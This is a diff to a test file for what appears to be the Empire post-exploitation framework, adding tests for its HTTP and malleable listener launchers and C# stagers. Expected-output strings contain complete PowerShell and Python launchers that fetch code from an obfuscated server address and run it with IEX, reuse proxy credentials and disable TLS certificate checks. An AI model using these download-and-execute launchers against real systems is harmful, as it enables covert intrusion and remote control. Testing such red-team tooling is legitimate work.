@@ -1,5 +1,6 @@
 import base64
 import json
+import re
 from pathlib import Path
 from textwrap import dedent
 from unittest.mock import MagicMock, Mock
@@ -216,10 +217,46 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
     assert powershell_launcher == _expected_http_malleable_powershell_launcher()
 
 
-def _build_malleable_listener(monkeypatch, main_menu_mock):
+def test_http_malleable_powershell_stager_separates_headers_with_marker(
+    monkeypatch, main_menu_mock
+):
+    """A profile User-Agent containing commas must reach the stager intact:
+    header entries are joined with <HEND>, and the stager splits on it."""
+    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
+    listener = _build_malleable_listener(
+        monkeypatch,
+        main_menu_mock,
+        profile_text=_profile_with_stager_block(
+            """
+            http-stager {
+                client {
+                    header "Accept" "*/*";
+                }
+            }
+            """,
+            user_agent=_COMMA_USER_AGENT,
+        ),
+    )
+
+    stager = listener.generate_stager(
+        listenerOptions=listener.options, language="powershell"
+    )
+
+    match = re.search(r'\$customHeaders = "(.*?)";', stager)
+    assert match, "stager did not render a $customHeaders assignment"
+    entries = match.group(1).split("<HEND>")
+    assert f"User-Agent:{_COMMA_USER_AGENT}" in entries
+    assert "Accept:*/*" in entries
+    assert "-split '<HEND>'" in stager
+    assert "-split ','" not in stager
+    assert "$wc.Headers.Set($headerKey, $headerValue);" in stager
+    assert "$wc.Headers.Add($headerKey, $headerValue);" not in stager
+
+
+def _build_malleable_listener(monkeypatch, main_menu_mock, profile_text=None):
     """Construct a validated malleable listener with the amazon sample
-    profile. Mirrors the setup in test_http_malleable_generate_launcher
-    but returns the listener for reuse."""
+    profile (or ``profile_text`` when given). Mirrors the setup in
+    test_http_malleable_generate_launcher but returns the listener for reuse."""
     packets = Mock()
     packets.build_routing_packet.return_value = b"routing packet"
     monkeypatch.setattr(
@@ -244,7 +281,7 @@ def _build_malleable_listener(monkeypatch, main_menu_mock):
     session_mock = MagicMock()
     profile_mock = MagicMock()
     session_mock.return_value.scalars.return_value.first.return_value = profile_mock
-    profile_mock.data = _fake_malleable_profile()
+    profile_mock.data = profile_text or _fake_malleable_profile()
     monkeypatch.setattr(
         "empire.server.listeners.http_malleable.listener.SessionLocal", session_mock
     )
@@ -454,28 +491,10 @@ def test_http_generate_launcher_csharp_plain_ships_without_malleable(
     malleable pipeline is exclusive to http_malleable's SharpireMalleable
     yaml, which pulls the extension library in as a second
     ReferenceSourceLibrary."""
-    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
-
-    packets = Mock()
-    packets.build_routing_packet.return_value = b"routing packet"
-    monkeypatch.setattr("empire.server.listeners.http.listener.packets", packets)
-
-    secrets_mock = MagicMock()
-    secrets_mock.choice.side_effect = lambda x: x[0]
-    monkeypatch.setattr("empire.server.listeners.http.listener.secrets", secrets_mock)
-
-    http_listener = build_test_listener("http", main_menu_mock)
-    http_listener.options["Host"]["Value"] = "http://localhost"
-    http_listener.options["Port"]["Value"] = "80"
-    http_listener.host_address = "http://localhost/"
+    http_listener = _build_http_csharp_listener(monkeypatch, main_menu_mock)
 
     compile_mock = MagicMock(return_value="/tmp/plain-sharpire.exe")
     main_menu_mock.dotnet_compiler.compile_stager = compile_mock
-
-    main_menu_mock.listeners.activeListeners = {
-        "fake_listener": {"options": http_listener.options}
-    }
-    http_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
     result = http_listener.generate_launcher(
         listener_name="fake_listener", language="csharp", encode=False
@@ -491,6 +510,64 @@ def test_http_generate_launcher_csharp_plain_ships_without_malleable(
     # System.Web.Extensions lives only on SharpireMalleable so plain builds
     # shouldn't pull it in as a reference assembly.
     assert "System.Web.Extensions" not in stager_yaml
+
+
+_UNRENDERED_PLACEHOLDER = re.compile(r"\{\{\s*\w+\s*\}\}")
+
+
+def _csharp_byte_array(raw: bytes) -> str:
+    return ",".join(f"0x{b:02x}" for b in raw)
+
+
+def _build_http_csharp_listener(monkeypatch, main_menu_mock):
+    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
+
+    packets = Mock()
+    packets.build_routing_packet.return_value = b"routing packet"
+    monkeypatch.setattr("empire.server.listeners.http.listener.packets", packets)
+
+    secrets_mock = MagicMock()
+    secrets_mock.choice.side_effect = lambda x: x[0]
+    monkeypatch.setattr("empire.server.listeners.http.listener.secrets", secrets_mock)
+
+    http_listener = build_test_listener("http", main_menu_mock)
+    http_listener.options["Host"]["Value"] = "http://localhost"
+    http_listener.options["Port"]["Value"] = "80"
+    http_listener.host_address = "http://localhost/"
+    main_menu_mock.listeners.activeListeners = {
+        "fake_listener": {"options": http_listener.options}
+    }
+    http_listener.threads = {"fake_listener": {"fake_thread": {}}}
+    return http_listener
+
+
+@pytest.mark.parametrize("listener_type", ["http", "http_malleable"])
+def test_csharp_stager_carries_server_public_key(
+    monkeypatch, main_menu_mock, listener_type
+):
+    """Sharpire fails closed without the server's Ed25519 public key, so the
+    rendered stager must carry the listener's real key — and no placeholder
+    may survive rendering (REPLACE_DEFAULTRESPONSE once silently did)."""
+    if listener_type == "http":
+        listener = _build_http_csharp_listener(monkeypatch, main_menu_mock)
+    else:
+        main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
+        listener = _build_malleable_listener(monkeypatch, main_menu_mock)
+
+    compile_mock = MagicMock(return_value="/tmp/sharpire.exe")
+    main_menu_mock.dotnet_compiler.compile_stager = compile_mock
+
+    listener.generate_launcher(
+        listener_name="fake_listener", language="csharp", encode=False
+    )
+
+    stager_yaml = compile_mock.call_args[0][0]
+    server_pk = _csharp_byte_array(
+        listener.server_private_cert_key_object.public_key().public_bytes_raw()
+    )
+    assert f"byte[] serverpk = new byte[] {{ {server_pk} }};" in stager_yaml
+    assert "sessionInfo.SetServerPublicKeyBytes(serverpk);" in stager_yaml
+    assert _UNRENDERED_PLACEHOLDER.search(stager_yaml) is None
 
 
 def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
@@ -619,7 +696,7 @@ def _expected_http_malleable_python_launcher():
         o = urllib.request.build_opener(proxy)
         urllib.request.install_opener(o)
         vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
-        req=vreq('http://localhost:80/init/', )
+        req=vreq(server+'init/', )
         req.verb='GET'
         req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
         req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
@@ -632,7 +709,7 @@ def _expected_http_malleable_python_launcher():
 
 
 def _expected_http_malleable_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/init/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
+    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/init/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _fake_malleable_profile():
@@ -721,6 +798,24 @@ def _fake_malleable_profile():
             }
         }
      """
+
+
+_COMMA_USER_AGENT = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+)
+
+
+def _profile_with_stager_block(block: str, user_agent: str | None = None):
+    """Amazon fixture plus an http-stager block, optionally with a different
+    global User-Agent."""
+    profile = _fake_malleable_profile()
+    if user_agent is not None:
+        profile = profile.replace(
+            'set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";',
+            f'set useragent "{user_agent}";',
+        )
+    return profile + dedent(block)
 
 
 def _expected_redirector_python_launcher():
@@ -954,3 +1049,97 @@ def test_unknown_uri_returns_iis_404_not_500_crash(monkeypatch, main_menu_mock, 
         "expected an 'unknown uri' WARNING from the dispatcher, saw: "
         f"{[r.getMessage() for r in caplog.records]}"
     )
+
+
+def _decode_ser(launcher: str) -> str:
+    """Decode the obfuscated $ser literal a PowerShell launcher embeds."""
+    match = re.search(
+        r"\$ser=\$\(\[Text\.Encoding\]::Unicode\.GetString\(\[Convert\]::FromBase64String\('([A-Za-z0-9+/=]+)'\)\)\)",
+        launcher,
+    )
+    assert match, "no $ser literal in launcher"
+    return base64.b64decode(match.group(1)).decode("utf-16-le")
+
+
+def _proxied_listener(monkeypatch, main_menu_mock):
+    """Reverse proxy on 8443 in front of a listener bound on 80, with a Host
+    option carrying no scheme so only host_address knows about TLS."""
+    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
+    listener.options["Host"]["Value"] = "proxy.example.com"
+    listener.options["Port"]["Value"] = "80"
+    listener.host_address = "https://proxy.example.com:8443/"
+    return listener
+
+
+def test_http_malleable_powershell_launcher_uses_advertised_address(
+    monkeypatch, main_menu_mock
+):
+    """The launcher must call the advertised address, and the scheme-less
+    Host option must not stop the TLS bypass from being emitted."""
+    listener = _proxied_listener(monkeypatch, main_menu_mock)
+
+    launcher = listener.generate_launcher(
+        listener_name="fake_listener", language="powershell", encode=False
+    )
+
+    assert _decode_ser(launcher) == "https://proxy.example.com:8443"
+    assert "$t='/init/';" in launcher
+    assert "ServerCertificateValidationCallback = {$true}" in launcher
+
+
+def test_http_malleable_python_launcher_uses_advertised_address(
+    monkeypatch, main_menu_mock
+):
+    listener = _proxied_listener(monkeypatch, main_menu_mock)
+
+    launcher = listener.generate_launcher(
+        listener_name="fake_listener", language="python", encode=False
+    )
+
+    assert "server='https://proxy.example.com:8443/'\n" in launcher
+    assert "req=vreq(server+'init/', )\n" in launcher
+    assert (
+        "ssl._create_default_https_context = ssl._create_unverified_context" in launcher
+    )
+    assert "proxy.example.com:80" not in launcher
+
+
+def test_http_malleable_launchers_keep_stager_query_string(monkeypatch, main_menu_mock):
+    """quantloader/jasperloader style stager blocks carry `parameter`
+    directives; the '?' between path and query must survive."""
+    listener = _build_malleable_listener(
+        monkeypatch,
+        main_menu_mock,
+        profile_text=_profile_with_stager_block(
+            """
+            http-stager {
+                set uri "/q2/Index.php";
+                client {
+                    parameter "id" "1";
+                }
+            }
+            """
+        ),
+    )
+
+    python_launcher = listener.generate_launcher(
+        listener_name="fake_listener", language="python", encode=False
+    )
+    powershell_launcher = listener.generate_launcher(
+        listener_name="fake_listener", language="powershell", encode=False
+    )
+
+    assert "req=vreq(server+'q2/Index.php?id=1', )\n" in python_launcher
+    assert "$t='/q2/Index.php?id=1';" in powershell_launcher
+
+
+def test_http_malleable_generate_launcher_raises_when_host_address_unset(
+    monkeypatch, main_menu_mock
+):
+    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
+    listener.host_address = None
+
+    with pytest.raises(RuntimeError, match="host_address"):
+        listener.generate_launcher(
+            listener_name="fake_listener", language="powershell", encode=False
+        )
